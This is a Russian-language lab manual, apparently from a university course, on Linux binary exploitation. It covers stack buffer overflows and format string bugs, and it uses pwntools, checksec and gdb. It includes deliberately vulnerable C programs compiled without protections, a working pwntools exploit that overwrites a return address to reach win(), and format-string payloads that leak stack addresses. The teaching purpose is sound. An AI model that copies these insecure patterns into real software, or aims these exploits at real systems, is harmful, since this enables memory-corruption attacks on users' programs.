# Методика проведения лабораторной работы по бинарной эксплуатации в Linux User-Mode

## Цель

Изучить базовые уязвимости бинарных приложений в Linux: уязвимость переполнения буфера на стеке (stack-based buffer overflow) и уязвимость форматной строки (format string vulnerability).

## Задачи

- Изучить базовые способы работы с библиотекой pwntools
- Изучить механизм эксплуатации уязвимости переполнения буфера
- Изучить механизм эксплуатации уязвимости форматной строки
- Изучить защитные механизмы, блокирующие эксплуатацию уязвимостей

## Введение

Рассмотрим следующий код на C:

```
#include <stdio.h>

int main(void) {
	char buf[32] = {0};

	puts("Input your string:");
	gets(buf);
}
```

Проведём компиляцию с помощью команды:

```
gcc -no-pie -fno-stack-protector vuln.c
```

В представленном выше коде присутствует [уязвимость переполнения буфера на стеке](http://phrack.org/issues/49/14.html). Дело в том, что функция gets, которая используется здесь для записи строки на стек, не является безопасной для использования: она не контролирует границы записи, из-за этого возникает возможность произвести запись вне границ переменной buf.

Также важно заметить, что флаги компиляции `-no-pie` и `-fno-stack-protector` отключают защитные механизмы программы: PIE и стековую канарейку. Механизм их работы будет рассмотрен далее.

## Установка checksec и работа с ним

Для исследования защитных механизмов бинарных приложений нам понадобится утилита `checksec`. Установить её можно, выполнив следующие команды:
```
wget https://github.com/slimm609/checksec.sh/archive/refs/tags/2.6.0.zip
unzip 2.6.0.zip
cd checksec.sh-2.6.0
./checksec
```
Затем укажем утилите объект анализа:
```
./checksec --file=../a.out
```
Мы получим вывод такого вида:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   62 Symbols	  No	0		1		../../a.out
```
Здесь мы также можем видеть, что механизмы защиты PIE и Canary отключены. Ранее мы отмечали это, рассматривая флаги компиляции, однако здесь мы можем получить такую информацию, не имея знаний об исходном коде и флагах его компиляции. 

Прочитать о таких защитных механизмах как NX и RELRO можно [здесь](https://hackmag.com/security/ctf-useless-crap/#p8).

## Основы pwntools

Также для ~~проведения хакерской атаки~~ эксплуатации бинарных уязвимостей нам необходимо уметь работать с современным фреймворком pwntools, в котором есть всё нам необходимое.

Установка:
```
pip install pwntools
```

Разработчик данной лабораторной работы крайне рекомендует использовать вторую версию Python для написания бинарных эксплойтов. Дело в том, что Вам очень много и часто придётся работать с сырыми байтами, а в третьей версии Python при взаимодействии с raw bytes очень легко ошибиться и потом придётся очень долго возиться с отладкой непонятно откуда взявшихся ошибок. 

Для импорта библиотеки чаще всего пользуются следующей командой, хоть это и не соответствует стандарту PEP8:
```
from pwn import *
```
Примерный скрипт для взаимодействия с программой выглядит следующим образом:
```
#!/usr/bin/python2
from pwn import *

p = process('./a.out')
data = p.recvline() # Получение одной строки вывода
data_chunk = p.recv(32) # Получение 32 байт данных
data_until = p.recvuntil('string') # Получение всех данных, выведенных в программе до подстроки string

p.send('my_name_is') # Отправка строки my_name_is без символа \n в конце
p.sendline('slim_shady') # Отправка строки slim_shady с символом переноса строки

p.interactive() # Запуск интерактивного режима работы с программой
```

## Эксплуатация уязвимости переполнения буфера

Может возникнуть вопрос: а чем же опасна уязвимость переполнения буфера? Вот в чём дело:

```
0x0:  |   data   |   |
0x8:  |   data   |   |
0x10: |   data   |   |
0x18: |   data   |   |
0x20: |   rbp    |   V
0x28: | ret addr |
```
Так выглядит пример разметки стекового фрейма в программах без стековой канарейки. Стрелкой вниз показано направление записи данных пользователем: сверху вниз. Примерные адреса установлены для понимания того, что `ret addr` лежит по большему смещению от начала стека, чем пользовательские данные. Однако, что вообще такое `ret addr`?

Когда в исполняемом файле происходит вызов функции, программа должна понимать куда ей возвращаться после того, как выполнение функции будет завершено. Эта локация и хранится на стеке под названием `return address`. 

Логичный вопрос: а что если по какой-то причине это значение будет каким-то способом изменено? Проверит ли программа то, что её пытаются взломать? Ответ: нет, не проверит.

На основе этого факта и выстроена методика эксплуатации уязвимости переполнения буфера на стеке: хакер переполняет заданный ему буфер, выходит за его границы, "доходит" до `return address` и перезаписывает его значение на какую-то подконтрольную локацию для получения примитива выполнения произвольного кода. 

Немного дополним предыдущий код и скомпилируем с теми же флагами:

```
#include <stdio.h>

int win() {
	puts("4r3 y0u 4 h3ck3r?");
}

int main(void) {
	char buf[32] = {0};

	puts("Input your string:");
	gets(buf);
}
```
Как можно увидеть, функция `win()` не вызывается нигде в коде программы. Однако у нас осталась уязвимость переполнения буфера. Попробуем провести на неё атаку и всё же вызвать функцию `win()`.

Посчитаем смещение от `&buf[0]` до `return address`: 
```
sizeof(rbp) == sizeof(void*) == 8
sizeof(buf) == 32
sizeof(buf) + sizeof(rbp) = 40
```
Понять почему происходит именно такое сложение несложно, если внимательно посмотреть на схему стекового фрейма, представленного выше.

После того, как мы запишем 40 байт мусора, мы сможем перезаписать значение `return address` на значение адреса функции `win()`. Узнаем этот адрес:

```
pturtle@pturtle:~ $ gdb a.out
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from a.out...
(No debugging symbols found in a.out)
(gdb) info functions win
All functions matching regular expression "win":

Non-debugging symbols:
0x0000000000401132  win
(gdb)
```
Сейчас у нас достаточно данных для написания эксплойта:
```
from pwn import *

win = 0x401132

p = process('./a.out')
p.recvuntil('string:\n')
p.sendline('A'*40 + p64(win))

"""
p64(addr) converts an address into raw bytes and translates it into a system endianness
In our case we have little endian
"""

p.interactive()
```

Студенту необходимо запустить эксплойт и представить его вывод.

## Уязвимость форматной строки

Рассмотрим другую уязвимость: уязвимость форматной строки. Для этого проанализируем следующий код:
```
#include <stdio.h>

int main() {
	char buf[64] = {0};
	puts("Input your string:");
	read(0, buf, 64);
	printf(buf);
}
```
Переполнения здесь нет, программа выглядит относительно безопасной. Однако можно увидеть, что пользовательский ввод подаётся первым аргументом к функции `printf`. Это означает, что пользователь можно контролировать так называемые `format specifiers`. Посмотрим к чему это может привести.

Важнейшими спецификаторами для нас являются: 
```
%s - выводит строку по адресу
%x - выводит 32-битное hex-значение
%p - выводит 64-битное hex-значение
%n - записывает по адресу количество уже выведенных байт
```
Вот как выглядит пример эксплутации уязвимости для получения адресов, лежащих на стеке:
```
pturtle@pturtle:~ $ ./a.out
Input your string:
%p %p %p %p %p %p %p %p %p %p %p
0x7ffca9794cd0 0x40 0x7ffb834bae8e 0x13 0x7ffb8358abe0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa (nil)
```
Важно подметить, что в определённом месте стека мы начинаем видеть свой же ввод (`0x7025207025207025 == '%p %p %p'`). Таким образом мы можем класть свои адреса на стек.

Также возможно сразу выбрать какой по счёту элемент стека мы хотим вывести с помощью конструкции `%N$p`:
```
pturtle@pturtle:~ $ ./a.out
Input your string:
%3$p %4$p %5$p
0x7fc90162de8e 0x13 0x7fc9016fdbe0
```
Итого: мы можем получать адреса со стека, а также записывать по произвольному адресу произвольное значение (количество уже выведенных байт). Таким образом можно получить исполнение произвольного кода. Конкретная эксплуатация сложнее чем в случае переполнения буфера, а потому выходит за рамки данной лабораторной работы, однако об этом можно узнать в [этом](https://youtu.be/t1LH9D5cuK4) видеоролике.

Студенту предлагается скомпилировать вышеприведённую программу, включив защитный механизм Fortify, и проанализировать как изменилось поведение программы при использовании спецификаторов `%n` и `%p`:
```
gcc -D_FORTIFY_SOURCE=2 -Wall -g -O2 vuln1.c
```

## Стековая канарейка

Стековая канарейка - определённое секретное значение, лежащее перед `rbp` и `return address`. 
```
0x0:  |   data   |   |
0x8:  |   data   |   |
0x10: |   data   |   |
0x18: |   data   |   |
0x20: |  canary  |   V
0x28: |   rbp    | 
0x30: | ret addr |
```
Рассмотрим следующий код:
```
#include <stdio.h>

int win() {
	puts("4r3 y0u 4 h3ck3r?");
}

int main() {
	char buf[64] = {0};
	for (int i = 0; i < 10; i++) {
		puts("Input your string:");
		gets(buf);
		printf(buf);
	}
}
```
Компиляция:
```
gcc -fstack-protector vuln1.c
```
Студенту предлагается ввести большое количество (>100) "мусорных" байт 10 раз, а затем проанализировать вывод программы. Что изменилось относительно предыдущего примера с переполнением буфера и функцией `win()`?

Опишите кратко возможно ли получить исполнение кода в этой программе. Также опишите возможно ли получить исполнение кода в этой программе, если убрать вызов функции printf.

## Ссылки для дальнейшего изучения

1. [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
2. [LiveOverflow binary exploitation playlist](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
3. [Protostar VM](https://exploit.education/protostar/)
4. [Useless Crap? No, not nearly!](https://hackmag.com/security/ctf-useless-crap)
